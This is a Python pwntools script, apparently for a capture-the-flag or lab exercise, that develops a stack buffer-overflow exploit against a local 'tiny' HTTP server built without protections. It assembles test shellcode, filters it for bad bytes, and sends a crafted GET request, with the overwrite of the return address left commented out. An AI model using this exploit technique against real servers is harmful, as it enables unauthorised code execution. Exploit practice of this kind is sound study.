from IPython import embed
from pwn import *
import sys, subprocess
import re

context.terminal = ['tmux', 'splitw', '-h']

ADDR = "127.0.0.1"
PORT = 9999
local_file = './tiny' # no protections

def http_request_bytes(path):
    return b"".join([
        b"GET ", path, b" HTTP/1.1\r\n",
        f"Host: {ADDR}:{PORT}\r\n".encode(),
        b"User-Agent: Hacker\r\n",
        b"\r\n"
        ])

def validate_shellcode(shellcode, forbidden=[]):
    for byte in forbidden:
        if byte in shellcode:
            return False
    return True

def c(comment):
    """this is just a hack to insert comments in the asm string"""
    return ""


def run_expl():
    p = remote(ADDR, PORT)
    # p.clean()
    
    padding_size = 0x230 # tiny no-protections

    shellcode_payload = f"""
      mov rax, 0x6161616161616161
      push rax
      push rsp
      pop rsi      {c("pointer to the string")}

      xor rax, rax
      mov al, 0x1  {c("write syscall")}
      xor rdi, rdi
      mov dil, 0x1 {c("stdout fd")}
      xor rdx, rdx
      mov dl, 0x8  {c("size")}
      syscall

      xor rax, rax
      mov al, 0x3c {c("exit syscall")}
      xor rdi, rdi
      syscall
    """

    context.log_level = "info"
    e = ELF(local_file)
    context.binary = e
    # libc = e.libc
    # libc.address = libc_base

    hex_payload = asm(shellcode_payload)
    if(not validate_shellcode(hex_payload, forbidden=[0x0, 0x20, 0x0a, 0x0d])):
        print("ERROR shellcode contains invalid bytes!")
        sys.exit(1)

    print(hex_payload)

    # buffer overflow
    expl = b''
    expl += b'aaaa%00bbb'
    #expl += hex_payload
    #expl += b'a'*(padding_size-len(hex_payload)) #padding, excluding rbp bytes
    #expl += b'b'*8 #rbp
    #expl += p64(0x7fffffffd670)[:-2] #evil buffer address
    # expl += b"\x01\x02\x03\x04bbbb" #override rbp

    http_req = http_request_bytes(expl)

    p.send(http_req)
    print(http_req)
    out = p.clean(timeout=1)
    print("---out---")
    print(out)
    p.close()

run_expl()
